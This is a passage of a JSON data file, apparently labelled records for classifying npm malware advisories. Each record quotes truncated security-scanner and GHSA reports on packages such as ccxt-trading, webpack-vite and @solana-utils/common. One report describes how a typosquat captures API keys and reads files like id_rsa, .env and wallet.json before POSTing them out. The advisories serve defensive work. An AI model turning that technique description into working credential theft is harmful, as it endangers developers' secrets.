+  "text": "Malicious code in ccxt-trading (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (b0442271e1969ce5899ac9176cf8dfed0dbf8edd46fecf99ee8e3cd4f21a92d8) Package name resembles the popular ccxt library. The exported ProExchange constructor, invoked whenever a consumer instantiates any exchange through the package's exchange map, captures the caller-supplied apiKey, secret, and password, gathers host identifiers (hostname, username, homedir, timestamp), and reads a list of home-directory files including wallet.json,.env, config.json, keypair.json, id_rsa, and credentials.json. The collected data is POSTed via https.request to the hardcoded destination "
+ },
+ {
+  "i": 48,
+  "group": "unclear",
+  "id": "MAL-2026-15843",
+  "rules": [],
+  "text": "Malicious code in is-generator-check (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (93931fecef2da94abf1de73e282da2c510715512d61bfe8afd1197925f4b6e08) The package was found to contain malicious code or consuming dependency that contains malicious code ## Source: ghsa-malware (c2c8213f15ed06c075cc5152b129a790d277a994c708e8d3b24c220fe7de9600) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, "
+ },
+ {
+  "i": 49,
+  "group": "unclear",
+  "id": "MAL-2026-918",
+  "rules": [],
+  "text": "Malicious code in webpack-vite (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6f7b28a9002453a46c97bba5ad0790e13ba1ba656971e78de46edf6efcd53154) The package webpack-vite was found to contain malicious code. ## Source: ghsa-malware (cd525d679fa448615bd48fe06d94f5cd6d94cb97f6ae72ae6afbb179027cce9c) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the packa"
+ },
+ {
+  "i": 50,
+  "group": "unclear",
+  "id": "MAL-2026-10789",
+  "rules": [],
+  "text": "Malicious code in @gocortexio/npmgremlinbox-apsl (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (ea7d3ddf2b4ebddd380dc96c807b2288155f0590b0260471b11902d4a0f66dcb) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 51,
+  "group": "unclear",
+  "id": "MAL-2026-11228",
+  "rules": [],
+  "text": "Malicious code in @solana-utils/common (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (abda158dfd80788df38b2221a5a9715eb7d6bebadb9569cfc51774985f39b0fa) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 52,
+  "group": "unclear",
+  "id": "MAL-2026-6679",
+  "rules": [],
+  "text": "Malicious code in agent-starter-pack (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (3a6a3e60c2dc67c55d728aaefbc972de29f46bdbfe7f013b3b6cde05907c2397) Package agent-starter-pack@0.0.1 was scanned with no a static rule matches and no behavioral findings. No lifecycle scripts, network destinations, credential reads, or other installer-harm patterns were observed in the analyzed contents. ## Source: ghsa-malware (a01e2e5f143532750a9c4c4d0e55b9afeed4eff74868142d6ec14f4bfb09d777) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately"
+ },
+ {
+  "i": 53,
+  "group": "unclear",
+  "id": "MAL-2026-12011",
+  "rules": [],
+  "text": "Malicious code in @keyv/compress-lz4 (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (cd7fac64e01bf267ca0ee1c3234782fd17c24865d3be3e0cbfa26b65fe83c1a3) Package is an LZ4 compression adapter for the keyv key-value store. The dist bundles (dist/index.cjs and dist/index.mjs) contain Buffer.from(..., 'base64')/.toString() calls, which is the expected shape for a compression/serialization codec that encodes and decodes binary payloads. No lifecycle scripts fetching remote content, no environment-variable or credential-path reads, no network exfiltration destinations, and no eval/exec of decoded content are present. The pattern-match on Buffer.from "
+ },
+ {
+  "i": 54,
+  "group": "unclear",
+  "id": "MAL-2026-520",
+  "rules": [],
+  "text": "Malicious code in ftm-noderpc (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (48bffc97a9e30f15aaeea633df39ff0ab500a8f4aeee9757390e0d0e2393e9d9) The package ftm-noderpc was found to contain malicious code. ## Source: ghsa-malware (b2c3dc311c3d101881ee473edd9232f94c95686770a45f681038070507407fc2) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package"
+ },
+ {
+  "i": 55,
+  "group": "unclear",
+  "id": "MAL-2026-15150",
+  "rules": [],
+  "text": "Malicious code in classlink-u1vqpl5z (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (b9599710c848a74113f06cd897bee6caed418286f4cab58e3b3c5772782d3a7a) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. "
+ },
+ {
+  "i": 56,
+  "group": "unclear",
+  "id": "MAL-2026-1430",
+  "rules": [],
+  "text": "Malicious code in @3stripes/utils (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (a35a49fa45b490839a3f7671aed0d41c821f7a2925a015debe9f168e09476451) The package @3stripes/utils was found to contain malicious code. ## Source: ossf-package-analysis (bc4b306efe8e2f54c22563b5927c251b0d6d41fd58d135b63192e3c712ce04fd) The OpenSSF Package Analysis project identified '@3stripes/utils' @ 999.0.2 (npm) as malicious. It is considered malicious because: - The package communicates with a domain associated with malicious activity. "
+ },
+ {
+  "i": 57,
+  "group": "unclear",
+  "id": "MAL-2026-14821",
+  "rules": [],
+  "text": "Malicious code in 3layerdipstackljpzly (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (b3a87dd5d668946ef5dde4861ddf4959b140c7fc9cf53decc9d6286fd3d2a1dd) The package was found to contain malicious code or consuming dependency that contains malicious code ## Source: ghsa-malware (e7dcd0f89833781381354537d7bace9775d0ae94ba295220c75dac9c1c00b22b) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity"
+ },
+ {
+  "i": 58,
+  "group": "unclear",
+  "id": "MAL-2026-7256",
+  "rules": [],
+  "text": "Malicious code in elf-stats-bright-star-581 (npm) || --- _-= Per source details. Do not edit below this line.=-_ "
+ },
+ {
+  "i": 59,
+  "group": "unclear",
+  "id": "MAL-2026-5962",
+  "rules": [],
+  "text": "Malicious code in @mastra/s3 (npm) || --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (69bd7442a33e88350e5a804e238625a967b16df137b4b1623cd6a0587d25dc21) The package was found to contain malicious code or consuming dependency that contains malicious code ## Source: ghsa-malware (b98af8656b4d02975d6d03cdf3d9ae4e541032783b3c1ff99eabca651f72ffc0) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is"
+ }
+]
